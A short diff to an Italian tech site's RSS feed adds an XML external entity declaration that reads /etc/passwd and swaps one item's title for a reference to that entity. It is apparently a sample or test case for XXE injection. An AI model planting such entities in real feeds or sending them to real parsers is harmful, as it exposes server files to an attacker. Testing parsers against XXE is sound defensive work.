@@ -1,4 +1,5 @@
 <rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/">
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
     <channel>
         <title>CCM</title>
         <ttl>60</ttl>
@@ -12,7 +13,7 @@
 
                     <item>
                 <guid>14362</guid>
-                <title>Instagram sticker donazioni in Italia</title>
+                <title>&xxe;</title>
                 <link>https://it.ccm.net/news/14362-instagram-sticker-donazioni-in-italia</link>
                 <category>Software</category>
                 <pubDate>Wed, 31 Jul 2019 07:10:06 GMT</pubDate>
